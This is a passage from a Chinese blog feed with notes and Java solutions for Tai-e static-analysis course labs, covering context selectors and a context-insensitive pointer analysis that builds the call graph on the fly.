class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectContext</span><span class="hljs-params">(CSCallSite callSite, JMethod callee)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-keyword">return</span> selectContext(callSite, <span class="hljs-literal">null</span>, callee);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectContext</span><span class="hljs-params">(CSCallSite callSite, CSObj recv, JMethod callee)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-keyword">return</span> ListContext.make(callSite.getCallSite());<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectHeapContext</span><span class="hljs-params">(CSMethod method, Obj obj)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-keyword">return</span> getEmptyContext();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="_2callselector"><a class="markdownIt-Anchor" href="#_2callselector"></a> _2CallSelector</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectContext</span><span class="hljs-params">(CSCallSite callSite, JMethod callee)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-keyword">return</span> selectContext(callSite, <span class="hljs-literal">null</span>, callee);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectContext</span><span class="hljs-params">(CSCallSite callSite, CSObj recv, JMethod callee)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-type">Context</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> callSite.getContext();<span class="hljs-comment">// c is a list</span><br>    <span class="hljs-comment">// Create a new context that contains the last previous context and the current context</span><br>    <span class="hljs-keyword">if</span> (c.getLength() &gt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">// 只包含最近的两个调用点</span><br>        <span class="hljs-keyword">return</span> ListContext.make(c.getElementAt(c.getLength() - <span class="hljs-number">1</span>), callSite.getCallSite());<br>    &#125;<br>    <span class="hljs-keyword">return</span> ListContext.make(callSite.getCallSite());<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectHeapContext</span><span class="hljs-params">(CSMethod method, Obj obj)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-type">Context</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> method.getContext();<br>    <span class="hljs-comment">// heap context only contain k-1 context</span><br>    <span class="hljs-keyword">if</span> (c.getLength() &gt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> ListContext.make(c.getElementAt(c.getLength() - <span class="hljs-number">1</span>));<br>    &#125;<br>    <span class="hljs-keyword">return</span> getEmptyContext();<br>&#125;<br></code></pre></td></tr></table></figure><p>​这里可以对比不同 k 下的调用点敏感的selector，发现底层都是调用 <code>public Context selectContext (CSCallSite callSite, CSObj recv, JMethod callee)</code> 方法来实现具体逻辑。对于 k 为 1 的情况，只用获得调用点处的上下文作为方法调用的上下文，而堆上下文是 k-1 为 0 个。对于 k 为 2 的情况，首先获取调用点处上下文，如果它的上下文队列大于0个，那么就获取调用点处上下文与队列的最后一个上下文作为调用方法的上下文，这里简单理解就是，调用方法继承调用点的上下文队列信息和调用点上下文，组成一个队列，然后根据  k来筛选出后 k 个上下文作为调用方法的上下文。而对于堆上下文，也是同理，不过成为了 k-1 个上下文继承，同时注意这里是从 CSMethod 中获得的上下文队列。</p><h4 id="_1objselector"><a class="markdownIt-Anchor" href="#_1objselector"></a> _1ObjSelector</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectContext</span><span class="hljs-params">(CSCallSite callSite, JMethod callee)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-keyword">return</span> callSite.getContext();<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectContext</span><span class="hljs-params">(CSCallSite callSite, CSObj recv, JMethod callee)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-keyword">return</span> ListContext.make(recv.getObject());<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectHeapContext</span><span class="hljs-params">(CSMethod method, Obj obj)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-keyword">return</span> getEmptyContext();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="_2objselector"><a class="markdownIt-Anchor" href="#_2objselector"></a> _2ObjSelector</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectContext</span><span class="hljs-params">(CSCallSite callSite, JMethod callee)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-keyword">return</span> callSite.getContext();<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectContext</span><span class="hljs-params">(CSCallSite callSite, CSObj recv, JMethod callee)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-type">Context</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> recv.getContext();<br>    <span class="hljs-keyword">if</span> (c.getLength() &gt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> ListContext.make(c.getElementAt(c.getLength() - <span class="hljs-number">1</span>), recv.getObject());<br>    &#125;<br>    <span class="hljs-keyword">return</span> ListContext.make(recv.getObject());<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectHeapContext</span><span class="hljs-params">(CSMethod method, Obj obj)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-type">Context</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> method.getContext();<br>    <span class="hljs-keyword">if</span> (c.getLength() &gt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> ListContext.make(c.getElementAt(c.getLength() - <span class="hljs-number">1</span>));<br>    &#125;<br>    <span class="hljs-keyword">return</span> getEmptyContext();<br>&#125;<br></code></pre></td></tr></table></figure><p>​这里和 CallSelector 大致一样，不过它是根据 recv 的上下文来决定调用方法的上下文的，所以对于第一个 <code>selectContext</code>，它就是直接根据 <code>callSite.getContext()</code> 返回调用点的上下文即可。同时经过本地测试 <code>_2CallSelector</code> 只能使用 <code>return selectContext(callSite, null, callee);</code>，而 <code>_1CallSelector</code> 因为只需要一个上下文，所以可以通过，这也印证了给的提示-&gt;</p><p>​“在调用点敏感中，对静态方法选取上下文的规则和实例方法的相同，即，对于一个静态方法调用，我们组合调用者方法的上下文与调用点本身，来构成被调用方法（本次静态方法调用的目标方法）的上下文。在对象敏感和类型敏感中，处理静态方法调用时简单直接地使用调用者方法的上下文作为被调用方法的上下文。”</p><h4 id="_1typeselector"><a class="markdownIt-Anchor" href="#_1typeselector"></a> _1TypeSelector</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectContext</span><span class="hljs-params">(CSCallSite callSite, JMethod callee)</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-keyword">return</span> callSite.getContext();<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectContext</span><span class="hljs-params">(CSCallSite callSite, CSObj recv, JMethod callee)</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-comment">// getContainerType return the type containing the allocation site of this object</span><br>       <span class="hljs-keyword">return</span> ListContext.make(recv.getObject().getContainerType());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectHeapContext</span><span class="hljs-params">(CSMethod method, Obj obj)</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-keyword">return</span> getEmptyContext();<br>   &#125;<br></code></pre></td></tr></table></figure><h4 id="_2typeselector"><a class="markdownIt-Anchor" href="#_2typeselector"></a> _2TypeSelector</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectContext</span><span class="hljs-params">(CSCallSite callSite, JMethod callee)</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-keyword">return</span> callSite.getContext();<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectContext</span><span class="hljs-params">(CSCallSite callSite, CSObj recv, JMethod callee)</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-type">Context</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> recv.getContext();<br>       <span class="hljs-keyword">if</span> (c.getLength() &gt; <span class="hljs-number">0</span>)&#123;<br>           <span class="hljs-keyword">return</span> ListContext.make(c.getElementAt(c.getLength() - <span class="hljs-number">1</span>), recv.getObject().getContainerType());<br>       &#125;<br>       <span class="hljs-keyword">return</span> ListContext.make(recv.getObject().getContainerType());<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Context <span class="hljs-title function_">selectHeapContext</span><span class="hljs-params">(CSMethod method, Obj obj)</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-type">Context</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> method.getContext();<br>       <span class="hljs-keyword">if</span> (c.getLength() &gt; <span class="hljs-number">0</span>)&#123;<br>           <span class="hljs-keyword">return</span> ListContext.make(c.getElementAt(c.getLength() - <span class="hljs-number">1</span>));<br>       &#125;<br>       <span class="hljs-keyword">return</span> getEmptyContext();<br>   &#125;<br></code></pre></td></tr></table></figure><p>​这里和 ObjSelector 很相近，但是作为中间的平衡产物，它也是利用了 <code>getContainerType()</code> 的方法来获取 Type信息，这里的Type就是一个类名，将上面根据对象来区分上下文的方法更为抽象表示了。</p>]]></content>
    
    
    <categories>
      
      <category>静态分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>《软件分析》Lab5</title>
    <link href="/posts/5d3aa80.html"/>
    <url>/posts/5d3aa80.html</url>
    
    <content type="html"><![CDATA[<h1 id="相关配置"><a class="markdownIt-Anchor" href="#相关配置"></a> 相关配置</h1><h2 id="java配置"><a class="markdownIt-Anchor" href="#java配置"></a> java配置</h2><ol><li>设置 <code>Settings -&gt; Project Structure -&gt; SDK: java17 -- Language level: 17 - Sealed types, always-strict floating-point semantics</code></li><li>设置 <code>Settings -&gt; Build,Execution,Deployment -&gt; Gradle -&gt; Build and run using: interlliJ IDEA(下面那个也一样)</code></li></ol><h2 id="dot-png"><a class="markdownIt-Anchor" href="#dot-png"></a> dot-&gt;png</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos">dot -Tpng <span class="hljs-built_in">tree</span>.dot -o <span class="hljs-built_in">tree</span>.png<br># 其中<span class="hljs-built_in">tree</span>.dot为dot形式名称，<span class="hljs-built_in">tree</span>.png为图片png形式名称<br></code></pre></td></tr></table></figure><h1 id="lab5"><a class="markdownIt-Anchor" href="#lab5"></a> Lab5</h1><h2 id="理解"><a class="markdownIt-Anchor" href="#理解"></a> 理解</h2><p>​这里就是根据指针分析的指南来完成，很详细。</p><ul><li>静态方法和实例方法的区别只有两个，因此可以把相同之处使用另一个方法封装。这里注意静态方法需要根据方法签名找到具体方法</li><li>注意 <code>AddReachable</code> 和 <code>Analysis</code> 中的 <code>AddEdge</code> 不太一样，前者需要 <code>o_i</code> 和 <code>f</code> 组成 <code>o_i.f</code> ，需要使用 InstanceField 方法；而后者可以直接对于 statement 的左右变量进行操作。<ul><li>这里由于 <code>AddReachable</code> 处理的没有涉及对象的(包含静态方法，静态字段，new和copy)，所以只需要statement就可以解决。</li><li>而 <code>Analysis</code> 中则需要解决需要实例化的情况(实例方法，字段，数组)，需要与对象进行连接，及两个参数</li></ul></li></ul><h2 id="题目相关"><a class="markdownIt-Anchor" href="#题目相关"></a> 题目相关</h2><p>​这里要求实现一个<strong>非上下文敏感</strong>的指针分析，并在指针分析的过程中实时构建调用图</p><h2 id="指针分析"><a class="markdownIt-Anchor" href="#指针分析"></a> 指针分析</h2><h3 id="ir"><a class="markdownIt-Anchor" href="#ir"></a> ir</h3><ul><li><p><code>pascal.taie.ir.stmt.DefinitionStmt</code></p><ul><li>它表示程序中所有的定义语句，在Lab3中对于AssignStmt进行过分析</li><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403301116178.png" alt="image-20240330111658111" /></li></ul></li><li><p><code>pascal.taie.ir.exp.Var</code></p><ul><li>它表示IR中的变量，提供一些API以供实例字段loads/stores、数组 loads/stores 或实例调用的 base 变量查找相关语句</li></ul></li></ul><h3 id="analysis"><a class="markdownIt-Anchor" href="#analysis"></a> analysis</h3><ul><li><code>pascal.taie.analysis.pta.core.heap.HeapModel</code><ul><li>表示堆抽象，用来对堆对象进行建模。给定一个 <code>New</code> 语句(即创建点 allocation site)，可以使用 <code>HeapModel</code> 的 <code>getObj(New)</code> 方法来获得与它对应的抽象对象(即 <code>Obj</code>)</li></ul></li></ul><h3 id="具体代码"><a class="markdownIt-Anchor" href="#具体代码"></a> 具体代码</h3><h4 id="代码总览"><a class="markdownIt-Anchor" href="#代码总览"></a> 代码总览</h4><p>​需要完成实现 <code>Solve类</code> 中的方法</p><ul><li><code>void addReachable(JMethod)</code></li><li><code>void addPFGEdge(Pointer,Pointer)</code></li><li><code>void analyze()</code></li><li><code>PointsToSet propagate(Pointer,PointsToSet)</code></li><li><code>void processCall(Var,Obj)</code></li></ul><p>​这里补充一张算法图，便于理解以下代码逻辑</p><table style="border:none;text-align:center;width:auto;margin: 0 auto;"><tbody><tr><td style="padding: 6px"><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403292350271.png" ></td>      <td><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403301551383.png" ></td></tr>        <tr>        <td><strong> 过程内指针分析算法 </strong></td>        <td><strong> 补充方法 </td>        </tr></tbody></table><h4 id="addreachable"><a class="markdownIt-Anchor" href="#addreachable"></a> addReachable</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Processes new reachable method.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addReachable</span><span class="hljs-params">(JMethod method)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-keyword">if</span> (!callGraph.addReachableMethod(method)) <span class="hljs-keyword">return</span>;<br>    method.getIR().forEach(stmt -&gt; &#123;<br>        stmt.accept(stmtProcessor);<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>​这里需要补充一下 <code>addReachableMethod(JMethod method)</code>，如果调用图因为此方法调用而改变，就返回 true。所以最开始就是判断该方法是否在RM中，如果在，即调用该方法调用图不发生改变，addReachableMethod返回false，也就是不进行处理了。</p><p>​之后使用了访问者模式，抽象出了 <code>stmtProcessor</code> 这个继承 <code>StmtVisitor&lt;Void&gt;</code> 的类，它包含着对于语句的处理，利用访问者模式分离了操作和数据结构。对于该方法的理解，就是首先遍历目前函数所有的 IR得到一个个 stmt ，然后对于每一个stmt 都执行 <code>stmt.accept(stmtProcessor);</code>，这里 <code>stmtProcessor</code> 就是上面visitor的继承类的实例，这里会根据 stmt 的类型来调用相应的 visit 语句，从而实现对于不同 stmt 的处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Processes statements in new reachable methods.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StmtProcessor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">StmtVisitor</span>&lt;Void&gt; &#123;<br>        <span class="hljs-comment">// TODO - if you choose to implement addReachable()</span><br>        <span class="hljs-comment">//  via visitor pattern, then finish me</span><br>        <span class="hljs-comment">// 1. New x = new T()</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Void <span class="hljs-title function_">visit</span><span class="hljs-params">(New stmt)</span>&#123;<br>            <span class="hljs-type">Pointer</span> <span class="hljs-variable">pointer</span> <span class="hljs-operator">=</span> pointerFlowGraph.getVarPtr(stmt.getLValue());<br>            <span class="hljs-comment">// Allocation-Site Abstraction</span><br>            <span class="hljs-type">PointsToSet</span> <span class="hljs-variable">pointsToSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PointsToSet</span>(heapModel.getObj(stmt));<br>            workList.addEntry(pointer, pointsToSet);<br>            <span class="hljs-keyword">return</span> StmtVisitor.<span class="hljs-built_in">super</span>.visit(stmt);<span class="hljs-comment">//这里返回值被忽略，可以直接写成null</span><br>        &#125;<br>        <span class="hljs-comment">// 2. Copy x = y</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Void <span class="hljs-title function_">visit</span><span class="hljs-params">(Copy stmt)</span>&#123;<br>            <span class="hljs-type">Pointer</span> <span class="hljs-variable">source</span> <span class="hljs-operator">=</span> pointerFlowGraph.getVarPtr(stmt.getRValue());<br>            <span class="hljs-type">Pointer</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> pointerFlowGraph.getVarPtr(stmt.getLValue());<br>            addPFGEdge(source, target);<br>            <span class="hljs-keyword">return</span> StmtVisitor.<span class="hljs-built_in">super</span>.visit(stmt);<br>        &#125;<br><br>        <span class="hljs-comment">// 3. x = y.f</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Void <span class="hljs-title function_">visit</span><span class="hljs-params">(LoadField stmt)</span>&#123;<br>            <span class="hljs-keyword">if</span> (!stmt.isStatic()) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">JField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> stmt.getFieldRef().resolve();<span class="hljs-comment">//这个就是作业提示中用来获取LoadField/StoreField 语句要 load/store 的字段</span><br>            <span class="hljs-type">Var</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> stmt.getLValue();<br>            addPFGEdge(pointerFlowGraph.getStaticField(f), pointerFlowGraph.getVarPtr(x));<br>            <span class="hljs-keyword">return</span> StmtVisitor.<span class="hljs-built_in">super</span>.visit(stmt);<br>        &#125;<br>        <span class="hljs-comment">// 4. x.f = y</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Void <span class="hljs-title function_">visit</span><span class="hljs-params">(StoreField stmt)</span>&#123;<br>            <span class="hljs-keyword">if</span>(!stmt.isStatic()) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// static也不是必要的，AddReachable和analysis都可以使用</span><br>            <span class="hljs-type">JField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> stmt.getFieldRef().resolve();<br>            <span class="hljs-type">Var</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> stmt.getRValue();<br>            addPFGEdge(pointerFlowGraph.getVarPtr(y), pointerFlowGraph.getStaticField(f));<br>            <span class="hljs-keyword">return</span> StmtVisitor.<span class="hljs-built_in">super</span>.visit(stmt);<br>        &#125;<br>        <span class="hljs-comment">// 5. y = x.m(...) 静态方法处理</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Void <span class="hljs-title function_">visit</span><span class="hljs-params">(Invoke stmt)</span>&#123;<br>            <span class="hljs-keyword">if</span> (stmt.isStatic()) &#123; <span class="hljs-comment">// 与方法调用相比，少了dispatch 和 返回值</span><br>                <span class="hljs-type">MethodRef</span> <span class="hljs-variable">methodRef</span> <span class="hljs-operator">=</span> stmt.getMethodRef();<br>                <span class="hljs-type">JMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> methodRef.getDeclaringClass().getDeclaredMethod(methodRef.getSubsignature());<br>                <span class="hljs-comment">//JMethod m = resolveCallee(null, stmt); // 仿照invoke call ，使用这个也可，看下面的定义，static可以忽略，则使用null</span><br>                processEachCall(stmt, m);<span class="hljs-comment">//这里是将后面processCall的逻辑抽离出来，以便可以在这里进行静态方法的调用</span><br>            &#125;<br>            <span class="hljs-keyword">return</span> StmtVisitor.<span class="hljs-built_in">super</span>.visit(stmt);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>​<code>StmtProcessor</code> 是对于指针分析规则的映射，对应于创建、赋值、静态字段存储、静态字段载入，静态方法调用。它处理的就是可以静态确定的事务，不用在动态运行中进行确定，。这里在提示中对于静态资源进行处理，而对于实例和数组的存储载入，都在analyze中进行处理。我觉得这里分开处理的原因就是 StmtProcessor 中的语句都是不涉及指针间传播的，创建与赋值都是构建 PFG 图所使用的，不涉及指针间指向内容的传递。而 analyze 中的语句则是对于指向对象在指针间的传递，所以需要在 WorkList 中间循环进行处理传递。</p><p>​同时这里的 <code>workList.addEntry</code> 就是增加指向关系，构建了指针到指针集的一条边来表明指向关系，这里下面的 <code>addPFGEdge</code> 也调用这个方法，所做的工作一样，但是它还考虑 PFG 中是否已经存在，存在就不用添加了。</p><h4 id="addpfgedge"><a class="markdownIt-Anchor" href="#addpfgedge"></a> addPFGEdge</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Adds an edge &quot;source -&gt; target&quot; to the PFG.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPFGEdge</span><span class="hljs-params">(Pointer source, Pointer target)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-keyword">if</span> (pointerFlowGraph.addEdge(source, target)) &#123;<br>        <span class="hljs-comment">// 这个判断是在做A6的时候意识到的，但是不加这个判断也通过了Oj，怀疑没有对这个进行检测或者 为空可以不关心(bushi)</span><br>        <span class="hljs-comment">// 再次看这个地方，可以理解为实现的是一个Map，target = &#123;PointsToSet&#125;，PointsToSet为空就是 target = &#123;&#125;,不影响后面的操作</span><br>        <span class="hljs-keyword">if</span> (!source.getPointsToSet().isEmpty()) &#123;<br>            workList.addEntry(target, source.getPointsToSet());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​这里 <code>addEdge</code> 与上文的 <code>addReachableMethod</code> 相同，只有这条边的call影响了PFG，才返回true。</p><h4 id="analyze"><a class="markdownIt-Anchor" href="#analyze"></a> analyze</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Processes work-list entries until the work-list is empty.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">analyze</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">/* TODO - finish me */</span><br>        <span class="hljs-keyword">while</span> (!workList.isEmpty())&#123;<br>            <span class="hljs-comment">// 1. remove &lt;n,pts&gt; from WL</span><br>            WorkList.<span class="hljs-type">Entry</span> <span 